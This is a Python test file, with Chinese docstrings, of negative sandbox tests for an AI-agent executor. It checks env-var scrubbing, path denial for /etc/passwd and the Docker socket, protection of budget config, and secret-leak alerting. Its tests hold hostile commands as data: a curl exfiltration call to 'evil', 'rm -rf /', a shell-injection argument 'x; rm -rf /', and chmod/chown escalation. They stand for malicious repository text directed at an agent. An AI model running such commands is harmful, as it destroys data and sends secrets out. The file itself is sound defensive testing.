"""X-02 验收：Agent 沙箱负向测试与密钥泄露测试（reference §4.1 / §9 / §12）。

覆盖 reference.md §4.1、§9、§12 规则 5/6/7 与任务清单 X-02 的负向测试验收标准：

- **环境/提供者密钥隔离：** 注入宿主机环境变量（provider 密钥）对子进程不可见；
  ``build_scrubbed_env`` 只继承白名单变量，不继承完整宿主环境。
- **路径/文件拒绝：** 访问宿主敏感文件、Docker Socket、越界绝对路径参数被拒绝
  （目录白名单与路径规范化）。
- **网络诚实声明：** 未批准出站网络时 ``network_isolated`` 如实标记（不伪称隔离）。
- **不可信内容不可提权：** 仓库中要求外传/忽略规则的恶意文本被命令白名单与路径
  校验拒绝——危险操作由外部策略层阻止，而非仅靠模型拒绝。
- **策略路径阻止：** 修改权限 / 预算硬上限 / 绕过审批被保护配置路径与命令白名单
  阻止。
- **Git Hook 禁用：** 净化环境不注入启用 Git Hook 的配置。
- **资源超限终止并清理：** CPU / 内存 / 时长超限被终止，per-run 工作区被清理。
- **Secret Scan 阻断：** 检测到密钥时停止任务并触发 CRITICAL 告警，任何存储行 /
  消息中不含原始密钥，且无跨任务数据读取。
"""

from __future__ import annotations

from pathlib import Path
from typing import TYPE_CHECKING

import pytest

from nexusai_lite import db
from nexusai_lite.alerts import AlertManager
from nexusai_lite.config import ProtectedConfigError, get_active_config, propose_config
from nexusai_lite.executor import DevExecutor
from nexusai_lite.sandbox import (
    FakeSandbox,
    LocalSandbox,
    ResourceLimits,
    SandboxResult,
    build_scrubbed_env,
    decide_network,
)
from nexusai_lite.secretscan import SecretLeakError, SecretScanner
from nexusai_lite.whitelist import (
    CommandWhitelist,
    DangerousCommandError,
    DirectoryWhitelist,
    PathNotAllowedError,
    validate_tool_call,
)

if TYPE_CHECKING:
    import sqlite3
    from collections.abc import Iterator

_PY = "python"


@pytest.fixture
def conn(tmp_path: Path) -> Iterator[sqlite3.Connection]:
    """返回已初始化的临时 SQLite 连接。"""
    db_path = tmp_path / "nexusai.db"
    db.init_db(db_path)
    c = db.connect(db_path)
    yield c
    c.close()


# ---------------------------------------------------------------- 密钥 / 环境变量隔离


def test_planted_host_env_var_invisible_to_child(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """宿主机注入的 provider 密钥变量不出现在净化后的子进程环境。"""
    monkeypatch.setenv("DEEPSEEK_API_KEY", "sk-fakeSecretProviderKey0001")
    workspace = tmp_path / "ws"
    workspace.mkdir(parents=True, exist_ok=True)
    env = build_scrubbed_env(workspace)
    # 白名单外变量不继承 → 子进程不可见。
    assert "DEEPSEEK_API_KEY" not in env
    assert env["HOME"] == str(workspace)
    assert env["TMPDIR"] == str(workspace / "tmp")


def test_local_sandbox_child_can_read_workdir_but_not_host_sec(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """本地沙箱子进程可见其工作区，但读不到宿主密钥变量。"""
    monkeypatch.setenv("SUPER_SECRET_VAR", "supersecretvalue")
    sandbox = LocalSandbox(workspace_root=tmp_path)
    probe = (
        "import os;"
        "print('SEC='+os.environ.get('SUPER_SECRET_VAR', 'NOT_SET'));"
        "print('HOME='+os.environ.get('HOME'))"
    )
    result = sandbox.run([_PY, "-c", probe], cwd=tmp_path)
    stdout = result.stdout
    assert "SEC=NOT_SET" in stdout  # 宿主密钥变量不可见
    assert str(tmp_path) in stdout  # 工作区已注入（HOME 指向工作区）


def test_local_sandbox_does_not_confine_same_user_file_reads(
    tmp_path: Path,
) -> None:
    """诚实边界：LocalSandbox 是环境/资源硬化，不是 OS 边界——被授权解释器可读同用户宿主文件。

    这与 ``SECURITY.md`` 的声明一致：``LocalSandbox`` 只做非 root、env scrub、
    rlimits、超时、工作区隔离与 argv 非 shell，**不**阻止同一用户可读的宿主文件。
    此测试固化了这一真实边界，而非宣称不存在的容器隔离；不可信任意代码须用
    尚未实现的 :class:`ContainerSandbox` 后端。
    """
    root = tmp_path / "root"
    root.mkdir(parents=True, exist_ok=True)
    # 位于工作区之外的、但当前用户可读的宿主文件（如同用户目录下的其它文件）。
    outside = tmp_path / "host-readable.txt"
    outside.write_text("HOSTSECRET-76291", encoding="utf-8")

    sandbox = LocalSandbox(workspace_root=root)
    probe = f"print(open({str(outside)!r}).read())"
    result = sandbox.run([_PY, "-c", probe], cwd=root)

    # 本地沙箱不阻止同用户读取宿主机文件——这是如实声明的限制，不是缺陷。
    assert "HOSTSECRET-76291" in result.stdout


# ---------------------------------------------------------------- 路径/文件拒绝


def test_host_sensitive_path_refused(tmp_path: Path) -> None:
    """访问宿主机敏感路径（如 /etc/passwd、Docker Socket）应被拒绝。"""
    whitelist = DirectoryWhitelist([tmp_path])
    with pytest.raises(PathNotAllowedError):
        whitelist.resolve(Path("/etc/passwd"))
    with pytest.raises(PathNotAllowedError):
        whitelist.resolve(Path("/var/run/docker.sock"))


def test_absolute_escape_arg_rejected(tmp_path: Path) -> None:
    """越界绝对路径参数应被拒绝（validate_tool_call 路径规范化）。"""
    with pytest.raises(PathNotAllowedError):
        validate_tool_call(
            ["git", "diff", "/etc/passwd"],
            cwd=tmp_path,
            roots=[tmp_path],
            commands=CommandWhitelist(["git"]),
        )


def test_no_cross_task_dir_read(tmp_path: Path) -> None:
    """一个任务的工作区不应能读取另一个任务的工作区（跨任务数据隔离）。"""
    task_a = tmp_path / "task-a"
    task_b = tmp_path / "task-b"
    task_a.mkdir(parents=True)
    task_b.mkdir(parents=True)
    whitelist_a = DirectoryWhitelist([task_a])
    # 任务 B 的目录不在任务 A 的授权根内。
    with pytest.raises(PathNotAllowedError):
        whitelist_a.resolve(task_b)


# ---------------------------------------------------------------- 网络诚实声明


def test_network_isolated_flag_is_honest() -> None:
    """未批准网络时 network_isolated 如实标记：unshare 不可用则置 False（不伪称）。"""
    prefix, isolated = decide_network(["git", "fetch"], allow_network=False)
    # 本环境 unshare -n 不可用 → 不伪称隔离。
    assert isolated is False
    assert prefix == []


def test_allow_network_disables_network_isolation_flag() -> None:
    """允许出站网络时不会声称已隔离。"""
    _, isolated = decide_network(["git", "fetch"], allow_network=True)
    assert isolated is False


# ---------------------------------------------------------------- 不可信内容不可提权


def test_malicious_repo_text_cannot_exfiltrate(tmp_path: Path) -> None:
    """恶意仓库文本指示外传/忽略规则：工具层（白名单/路径）仍阻止，非仅模型拒绝。"""
    # 不可信文本要求运行 curl 外传或 rm 破坏——均不在白名单。
    for malicious in (["curl", "http://evil/x"], ["bash", "-c", "curl evil"], ["rm", "-rf", "/"]):
        with pytest.raises(DangerousCommandError):
            validate_tool_call(
                malicious,
                cwd=tmp_path,
                roots=[tmp_path],
                commands=CommandWhitelist(["python", "pytest", "ruff"]),
            )


def test_shell_metacharacter_injection_rejected(tmp_path: Path) -> None:
    """含 shell 元字符的参数（注入绕过白名单）应被拒绝。"""
    with pytest.raises(DangerousCommandError):
        validate_tool_call(
            ["git", "diff", "--", "x; rm -rf /"],
            cwd=tmp_path,
            roots=[tmp_path],
            commands=CommandWhitelist(["git"]),
        )


# ---------------------------------------------------------------- 策略路径阻止


def test_budget_change_without_human_approval_blocked(tmp_path: Path) -> None:
    """未经人工审批修改预算硬上限配置应被保护配置路径阻止。"""
    db_path = tmp_path / "cfg.db"
    db.init_db(db_path)
    conn = db.connect(db_path)
    try:
        active = get_active_config(conn)
        payload = active.model_dump()
        payload["budget"] = {"daily_hard_limit": 9999.0}
        with pytest.raises(ProtectedConfigError):
            propose_config(conn, payload, change_reason="agent 企图上调预算")
    finally:
        conn.close()


def test_permission_modifying_command_not_allowlisted(tmp_path: Path) -> None:
    """修改权限 / 属主的命令（chmod/chown）不在白名单 → 被拒。"""
    for cmd in (["chmod", "777", "/x"], ["chown", "root", "/x"]):
        with pytest.raises(DangerousCommandError):
            validate_tool_call(
                cmd,
                cwd=tmp_path,
                roots=[tmp_path],
                commands=CommandWhitelist(["python", "git"]),
            )


# ---------------------------------------------------------------- Git Hook 禁用


def test_scrubbed_env_does_not_enable_git_hooks(tmp_path: Path) -> None:
    """净化环境不注入启用 Git Hook 的配置（core.hooksPath / GIT_*）。"""
    workspace = tmp_path / "ws"
    workspace.mkdir(parents=True, exist_ok=True)
    env = build_scrubbed_env(workspace)
    for key in env:
        assert "HOOKS" not in key
        assert not key.startswith("GIT_")
    assert "core.hooksPath" not in env


# ---------------------------------------------------------------- 资源超限终止并清理


def test_duration_over_limit_terminated_and_cleaned(tmp_path: Path) -> None:
    """执行时长超限应被终止，per-run 工作区应被清理。"""
    sandbox = LocalSandbox(workspace_root=tmp_path)
    limits = ResourceLimits(wall_timeout_seconds=0.2)
    result = sandbox.run(
        [_PY, "-c", "import time; time.sleep(5)"],
        cwd=tmp_path,
        timeout_seconds=0.2,
        limits=limits,
    )
    assert result.timed_out is True
    assert result.killed_reason == "timeout"
    # 工作区已销毁（keep_workspace=False）。
    leftovers = list(tmp_path.glob("ws-*"))
    assert leftovers == []


# ---------------------------------------------------------------- Secret Scan 阻断


def test_secret_scan_detects_planted_secret_and_alerts(
    conn: sqlite3.Connection,
) -> None:
    """Secret Scan 检测到密钥 → 抛错并触发 CRITICAL 告警，存储不含原始密钥。"""
    manager = AlertManager(conn, dedup_window_seconds=0)
    secret = "sk-fakeSecretValueForScan0001"  # noqa: S105
    findings = SecretScanner().scan_text(f"api_key = {secret}" + "\n", location="diff")
    assert any(f.severity == "high" for f in findings)
    with pytest.raises(SecretLeakError):
        SecretScanner().assert_clean(findings, alert_manager=manager, scope="task:t1")
    row = conn.execute(
        "SELECT severity, code, message, title, detail_json FROM alerts WHERE code=?",
        ("SECRET_LEAK_DETECTED",),
    ).fetchone()
    assert row is not None
    assert row["severity"] == "critical"
    assert secret not in row["message"]
    assert secret not in (row["detail_json"] or "")
    # 告警载荷中不得包含原始密钥。
    stored = conn.execute("SELECT * FROM alerts WHERE code='SECRET_LEAK_DETECTED'").fetchall()
    for r in stored:
        assert secret not in (r["message"] or "")
        assert secret not in (r["title"] or "")
        assert secret not in (r["detail_json"] or "")


def test_executor_blocks_secret_leak_task(
    conn: sqlite3.Connection, tmp_path: Path
) -> None:
    """执行器在 Secret Scan 检测到密钥时停止任务、触发告警且不写补丁，存储无密钥。"""
    secret = "sk-fakeSecretExecutorKey0001"  # noqa: S105
    manager = AlertManager(conn, dedup_window_seconds=0)
    sandbox_result = SandboxResult(
        exit_code=0,
        stdout=f"+++ a.py\n+api_key = {secret}\n",
        stderr="",
        duration_seconds=0.0,
        timed_out=False,
        killed_reason=None,
        network_isolated=False,
        sandbox_kind="fake",
    )
    workspace = tmp_path / "workspace"
    workspace.mkdir(parents=True, exist_ok=True)
    drafts = tmp_path / "drafts"
    executor = DevExecutor(
        conn,
        sandbox=FakeSandbox(sandbox_result),
        workspace_root=workspace,
        commands=CommandWhitelist(["git"]),
        drafts_dir=drafts,
        alert_manager=manager,
        argv_for=lambda task: ("git", "diff"),
    )
    task = executor._tasks.create_task(task_type="llm", estimated_cost=0.1)
    executor._tasks.queue(task.task_id)
    result = executor.run_task(task.task_id)
    assert result.status == "FAILED"
    assert result.draft is None  # 不持久化任何“干净”补丁
    task_row = executor._tasks.get_task(task.task_id)
    assert task_row is not None
    assert task_row.error_code == "SECRET_LEAK"
    assert secret not in (task_row.safe_error_message or "")
    # CRITICAL 告警已触发且不含密钥。
    alert_row = conn.execute(
        "SELECT severity FROM alerts WHERE code='SECRET_LEAK_DETECTED'"
    ).fetchone()
    assert alert_row is not None
    assert alert_row["severity"] == "critical"
    stored = conn.execute("SELECT * FROM alerts WHERE code='SECRET_LEAK_DETECTED'").fetchall()
    for r in stored:
        assert secret not in (r["message"] or "")
        assert secret not in (r["detail_json"] or "")
